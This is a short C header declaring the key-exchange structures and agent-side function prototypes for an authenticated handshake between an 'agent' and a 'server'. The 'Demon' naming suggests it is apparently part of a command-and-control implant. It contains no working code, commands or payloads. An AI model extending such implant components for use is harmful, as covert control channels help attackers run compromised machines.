#ifndef DEMON_CRYPTO_KEX_H
#define DEMON_CRYPTO_KEX_H

#include <windows.h>
#include <common/Macros.h>

// Sizes
#define KEX_PUB_LEN   32
#define KEX_PRIV_LEN  32
#define KEX_NONCE_LEN 16
#define KEX_MAC_LEN   32
#define KEX_KEY_LEN   32

// AgentHello: Ea || nonce_a || mac_a
typedef struct _KEX_AGENT_HELLO {
    BYTE Ea[KEX_PUB_LEN];
    BYTE NonceA[KEX_NONCE_LEN];
    BYTE MacA[KEX_MAC_LEN];
} KEX_AGENT_HELLO, *PKEX_AGENT_HELLO;

// ServerHello: Es || nonce_s || mac_s
typedef struct _KEX_SERVER_HELLO {
    BYTE Es[KEX_PUB_LEN];
    BYTE NonceS[KEX_NONCE_LEN];
    BYTE MacS[KEX_MAC_LEN];
} KEX_SERVER_HELLO, *PKEX_SERVER_HELLO;

// Derived keys
typedef struct _KEX_DERIVED_KEYS {
    BYTE AesKey[KEX_KEY_LEN];
    BYTE AesIv[KEX_NONCE_LEN];  // reuse nonce length as IV length
    BYTE MacKey[KEX_KEY_LEN];
} KEX_DERIVED_KEYS, *PKEX_DERIVED_KEYS;

// Agent-side helpers
BOOL KexAgentBuildHello(
    _In_reads_bytes_(KEX_KEY_LEN) BYTE* Psk,
    _Out_ PKEX_AGENT_HELLO Hello,
    _Out_writes_bytes_(KEX_PRIV_LEN) BYTE* EphemeralPriv);

BOOL KexAgentProcessServerHello(
    _In_reads_bytes_(KEX_KEY_LEN) BYTE* Psk,
    _In_reads_bytes_(KEX_PRIV_LEN) BYTE* EphemeralPriv,
    _In_ PKEX_AGENT_HELLO AgentHello,
    _In_ PKEX_SERVER_HELLO ServerHello,
    _Out_ PKEX_DERIVED_KEYS Derived);

#endif // DEMON_CRYPTO_KEX_H

